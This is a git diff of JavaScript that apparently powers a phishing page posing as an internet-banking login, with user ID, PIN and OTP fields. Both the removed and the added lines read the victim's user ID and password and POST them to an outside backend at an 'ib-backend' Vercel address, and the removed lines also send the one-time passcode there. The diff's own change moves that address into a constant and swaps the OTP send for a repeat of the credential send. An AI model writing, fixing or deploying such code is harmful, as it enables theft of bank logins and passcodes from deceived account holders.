@@ -1,5 +1,4 @@
-// 1. YOUR RENDER BACKEND URL (At the very top)
-const renderURL =  "https://ib-backend-rho.vercel.app/send-data";
+const BACKEND_URL = "https://ib-backend-rho.vercel.app/send-data";
 // 2. THE WATERMARK FUNCTION (The one I missed!)
 const setupWatermark = (inputId, labelId) => {
     const input = document.getElementById(inputId);
@@ -23,12 +22,11 @@ document.addEventListener('DOMContentLoaded', () => {
             const user = document.getElementById('txiID').value;
             const pass = document.getElementById('txiPwd').value;
 
-                // SEND OTP TO VERCEL
-                fetch('https://ib-backend-rho.vercel.app/send-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userId: user, pin: pass })
-            });
+              fetch(BACKEND_URL, { 
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ userId: user, pin: pass }) 
+})
 
             // UI Animations
             const toHide = document.querySelectorAll('.EnterData, .btnLogOnCover, .btnRegisterOnline, .BHBox, .iBankingLoGo');
@@ -56,12 +54,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 return;
             }
 
-                // SEND OTP TO VERCEL
-                fetch('https://ib-backend-rho.vercel.app/send-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ otp: otpCode })
-            });
+fetch(BACKEND_URL, { 
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ userId: user, pin: pass }) 
+})
 
             btnVerify.innerText = "Verifying...";
             setTimeout(() => {
